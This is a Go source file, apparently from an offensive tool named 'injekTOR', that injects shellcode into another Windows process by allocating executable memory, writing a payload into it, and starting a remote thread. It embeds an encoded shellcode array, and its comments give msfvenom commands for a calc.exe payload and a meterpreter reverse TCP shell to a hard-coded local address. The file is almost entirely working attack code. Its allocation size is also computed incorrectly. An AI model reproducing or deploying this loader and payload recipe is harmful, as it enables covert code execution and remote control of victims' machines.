package injections

import (
	"fmt"
	"injekTOR/psapi"
	"syscall"
	"unsafe"
)

const(
	MEM_RESERVE = 0x00002000
	MEM_COMMIT = 0x00001000
	PAGE_EXECUTE_READWRITE =  0x40
)


func errno(e1 error) error {
	if e1, ok := e1.(syscall.Errno); ok && e1 == 0 {
		e1 = syscall.EINVAL
	}
	return e1
}

func VirtualAllocEx(processHandle uintptr, allocationSize uintptr)(allocatedAddr uintptr, err error){

	var (
		kernel32 = syscall.NewLazyDLL("kernel32.dll")
		procVirtualAllocEx = kernel32.NewProc("VirtualAllocEx")
	)

	r1, _, e1 := procVirtualAllocEx.Call(
		processHandle,
		uintptr(unsafe.Pointer(nil)),
		unsafe.Sizeof(allocationSize),
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE,
	)

	if r1==0 {
		e1 = errno(e1)
	} else{
		allocatedAddr = r1
	}

	return allocatedAddr,e1
}

func WriteProcessMemory(processHandle uintptr, allocatedAddr uintptr, data []byte )(success bool, err error){

	var (
		kernel32 = syscall.NewLazyDLL("kernel32.dll")
		procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	)

	r1, _, e1 := procWriteProcessMemory.Call(
		processHandle,
		allocatedAddr,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		0)

	if r1 == 0{
		success = false
	}else{
		success = true
	}
	return success, errno(e1)
}

func CreateRemoteThread(processHandle uintptr, allocatedAddr uintptr)(threadHandle uintptr, err error){
	var (
		kernel32 = syscall.NewLazyDLL("kernel32.dll")
		procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
	)

	r1, _, e1 := procCreateRemoteThread.Call(
		processHandle,
		0,
		0,
		allocatedAddr,
		0,
		0,
	)

	return r1,errno(e1)
}

func ShellCodeInjection_test(pid uint32){

	//How it work :
		//OpenProcess()
		//VirtualAllocEx()
		//WriteProcessMemory()
		//CreateRemoteThread()
		//CloseHandle

	// payloads
		//sudo msfvenom -p windows/x64/exec CMD=calc.exe -f csharp -b "\x00\x0a\x00"
		//sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.83 LPORT=4444 -f csharp -b "\x00\x0a\x00"
	var shellcode = []byte{
		0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
		0xff,0xff,0x48,0xbb,0x1b,0x99,0x19,0x7e,0x1a,0xf7,0x33,0xec,0x48,0x31,0x58,
		0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0xe7,0xd1,0x9a,0x9a,0xea,0x1f,
		0xf3,0xec,0x1b,0x99,0x58,0x2f,0x5b,0xa7,0x61,0xbd,0x4d,0xd1,0x28,0xac,0x7f,
		0xbf,0xb8,0xbe,0x7b,0xd1,0x92,0x2c,0x02,0xbf,0xb8,0xbe,0x3b,0xd1,0x92,0x0c,
		0x4a,0xbf,0x3c,0x5b,0x51,0xd3,0x54,0x4f,0xd3,0xbf,0x02,0x2c,0xb7,0xa5,0x78,
		0x02,0x18,0xdb,0x13,0xad,0xda,0x50,0x14,0x3f,0x1b,0x36,0xd1,0x01,0x49,0xd8,
		0x48,0x36,0x91,0xa5,0x13,0x67,0x59,0xa5,0x51,0x7f,0xca,0x7c,0xb3,0x64,0x1b,
		0x99,0x19,0x36,0x9f,0x37,0x47,0x8b,0x53,0x98,0xc9,0x2e,0x91,0xbf,0x2b,0xa8,
		0x90,0xd9,0x39,0x37,0x1b,0x27,0xd0,0xba,0x53,0x66,0xd0,0x3f,0x91,0xc3,0xbb,
		0xa4,0x1a,0x4f,0x54,0x4f,0xd3,0xbf,0x02,0x2c,0xb7,0xd8,0xd8,0xb7,0x17,0xb6,
		0x32,0x2d,0x23,0x79,0x6c,0x8f,0x56,0xf4,0x7f,0xc8,0x13,0xdc,0x20,0xaf,0x6f,
		0x2f,0x6b,0xa8,0x90,0xd9,0x3d,0x37,0x1b,0x27,0x55,0xad,0x90,0x95,0x51,0x3a,
		0x91,0xb7,0x2f,0xa5,0x1a,0x49,0x58,0xf5,0x1e,0x7f,0x7b,0xed,0xcb,0xd8,0x41,
		0x3f,0x42,0xa9,0x6a,0xb6,0x5a,0xc1,0x58,0x27,0x5b,0xad,0x7b,0x6f,0xf7,0xb9,
		0x58,0x2c,0xe5,0x17,0x6b,0xad,0x42,0xc3,0x51,0xf5,0x08,0x1e,0x64,0x13,0xe4,
		0x66,0x44,0x36,0xa0,0xf6,0x33,0xec,0x1b,0x99,0x19,0x7e,0x1a,0xbf,0xbe,0x61,
		0x1a,0x98,0x19,0x7e,0x5b,0x4d,0x02,0x67,0x74,0x1e,0xe6,0xab,0xa1,0x07,0x86,
		0x4e,0x4d,0xd8,0xa3,0xd8,0x8f,0x4a,0xae,0x13,0xce,0xd1,0x9a,0xba,0x32,0xcb,
		0x35,0x90,0x11,0x19,0xe2,0x9e,0x6f,0xf2,0x88,0xab,0x08,0xeb,0x76,0x14,0x1a,
		0xae,0x72,0x65,0xc1,0x66,0xcc,0x1d,0x7b,0x9b,0x50,0xc2,0x7e,0xe1,0x7c,0x7e,
		0x1a,0xf7,0x33,0xec }



	fmt.Println("!!!! GETTING PROCESS HANDLE !!!!!")
	processHandle, errOpenprocess := psapi.OpenProcess(psapi.PROCESS_ALL_ACCESS,0,pid)
	fmt.Println(processHandle, errOpenprocess)

	fmt.Println("!!!! PRINTING FULL PATH!!! !!!!!")
	fmt.Println(psapi.GetModuleFileNameExA(processHandle,uintptr(unsafe.Pointer(nil))))

	fmt.Println("!!!! ALLCOATING MEMORY !!!!!")
	allocatedAddr, err := VirtualAllocEx(processHandle,unsafe.Sizeof(shellcode)+1000)
	fmt.Println(allocatedAddr,err)

	fmt.Println("!!!! WRITTING MEMORY !!!!!")
	success, err := WriteProcessMemory(processHandle,allocatedAddr,shellcode)
	fmt.Println(success, err)

	fmt.Println("!!!! CREATE REMOTE THREAD !!!!!")
	threadHandle, err := CreateRemoteThread(processHandle,allocatedAddr)
	fmt.Println(threadHandle,err)
}